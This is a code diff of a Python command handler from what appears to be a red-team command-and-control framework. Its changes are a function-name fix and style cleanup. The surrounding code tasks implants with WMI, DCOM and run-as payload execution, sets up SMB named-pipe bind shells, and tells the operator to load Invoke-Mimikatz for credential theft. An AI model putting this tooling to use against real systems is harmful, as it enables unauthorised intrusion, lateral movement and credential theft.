@@ -96,7 +96,7 @@ def handle_ps_command(command, user, randomuri, implant_id):
         do_invoke_wmiexec(user, command, randomuri)
         return
     elif command.startswith("invoke-wmijspbindpayload "):
-        do_invoke_wmijsbindpayload(user, command, randomuri)
+        do_invoke_wmijspbindpayload(user, command, randomuri)
         return
     elif command.startswith("invoke-wmijsproxypayload "):
         do_invoke_wmijsproxypayload(user, command, randomuri)
@@ -361,7 +361,7 @@ def do_invoke_wmiexec(user, command, randomuri):
 
 
 @creds()
-def do_invoke_wmijsbindpayload(user, command, randomuri):
+def do_invoke_wmijspbindpayload(user, command, randomuri):
     check_module_loaded("New-JScriptShell.ps1", randomuri, user)
     with open("%s%sDotNet2JS_PBind.b64" % (PayloadsDirectory, ""), "r") as p:
         payload = p.read()
@@ -374,16 +374,16 @@ def do_invoke_wmijsbindpayload(user, command, randomuri):
     C2 = get_c2server_all()
     print()
     print("To connect to the SMB named pipe use the following command:")
-    print(Colours.GREEN+"invoke-pbind -target %s -secret mtkn4 -key %s -pname jaccdpqnvbrrxlaf -client" % (target[0],C2[2])+Colours.END)
+    print(Colours.GREEN + "invoke-pbind -target %s -secret mtkn4 -key %s -pname jaccdpqnvbrrxlaf -client" % (target[0], C2[2]) + Colours.END)
     print()
     print("To issue commands to the SMB named pipe use the following command:")
-    print(Colours.GREEN+"pbind-command \"pwd\""+Colours.END)
+    print(Colours.GREEN + "pbind-command \"pwd\"" + Colours.END)
     print()
     print("To load modules to the SMB named pipe use the following command:")
-    print(Colours.GREEN+"pbind-loadmodule Invoke-Mimikatz.ps1"+Colours.END)
+    print(Colours.GREEN + "pbind-loadmodule Invoke-Mimikatz.ps1" + Colours.END)
     print()
     print("To kill the SMB named pipe use the following command:")
-    print(Colours.GREEN+"pbind-kill"+Colours.END)
+    print(Colours.GREEN + "pbind-kill" + Colours.END)
 
 
 @creds()
@@ -518,7 +518,7 @@ def do_invoke_dcompayload(user, command, randomuri):
     new_task(pscommand, user, randomuri)
 
 
-@creds(accept_hashes = False)
+@creds(accept_hashes=False)
 def do_invoke_runas(user, command, randomuri):
     check_module_loaded("Invoke-RunAs.ps1", randomuri, user)
     params = re.compile("invoke-runas ", re.IGNORECASE)
@@ -527,7 +527,7 @@ def do_invoke_runas(user, command, randomuri):
     new_task(cmd, user, randomuri)
 
 
-@creds(accept_hashes = False)
+@creds(accept_hashes=False)
 def do_invoke_runasdaisypayload(user, command, randomuri):
     daisyname = input("Name required: ")
     if os.path.isfile(("%s%spayload.bat" % (PayloadsDirectory, daisyname))):
@@ -546,7 +546,7 @@ def do_invoke_runasdaisypayload(user, command, randomuri):
         return
 
 
-@creds(accept_hashes = False)
+@creds(accept_hashes=False)
 def do_invoke_runasproxypayload(user, command, randomuri):
     C2 = get_c2server_all()
     if C2[11] == "":
@@ -569,7 +569,7 @@ def do_invoke_runasproxypayload(user, command, randomuri):
         new_task(pscommand, user, randomuri)
 
 
-@creds(accept_hashes = False)
+@creds(accept_hashes=False)
 def do_invoke_runaspayload(user, command, randomuri):
     check_module_loaded("Invoke-RunAs.ps1", randomuri, user)
     check_module_loaded("NamedPipe.ps1", randomuri, user)
@@ -592,7 +592,6 @@ def do_get_pid(user, command, randomuri):
 def do_upload_file(user, command, randomuri):
     source = ""
     destination = ""
-    s = ""
     nothidden = False
     if command == "upload-file":
         style = Style.from_dict({
